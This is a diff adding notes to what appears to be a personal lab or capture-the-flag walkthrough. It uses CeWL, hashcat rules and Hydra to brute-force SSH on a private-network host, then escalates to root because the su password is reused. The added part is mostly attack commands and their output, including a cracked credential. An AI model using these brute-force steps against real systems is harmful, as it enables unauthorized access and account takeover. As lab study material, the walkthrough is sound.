@@ -146,3 +146,35 @@ WELCOME !
 martin@debian:~$ 
 
 
+
+#crawl a psswd list,source from a web packages
+└─$ cewl -m 5 -o http://172.16.85.132/ -w rawpass.txt  #-m mini length
+CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+
+# a rule to create the list, by the way of hashcat
+$hashcat --stdout name.txt  -r /usr/share/hashcat/rules/combinator.rule -o newname.txt
+
+# to brute force ssh port.
+
+└─$ hydra -t 15 -L namelist.txt -P passwd.txt 172.16.85.132 ssh
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-09 02:31:19
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 15 tasks per 1 server, overall 15 tasks, 1008 login tries (l:1/p:1008), ~68 tries per task
+[DATA] attacking ssh://172.16.85.132:22/
+[STATUS] 90.00 tries/min, 90 tries in 00:01h, 918 to do in 00:11h, 15 active
+ 
+
+
+[STATUS] 105.00 tries/min, 315 tries in 00:03h, 693 to do in 00:07h, 15 active
+
+[STATUS] 87.86 tries/min, 615 tries in 00:07h, 393 to do in 00:05h, 15 active
+[22][ssh] host: 172.16.85.132   login: hadi   password: hadi123
+
+hadi@debian:/home/martin$ su 
+Mot de passe : 
+root@debian:/home/martin# id
+uid=0(root) gid=0(root) groupes=0(root)
+# the su passwd is the same as hadi
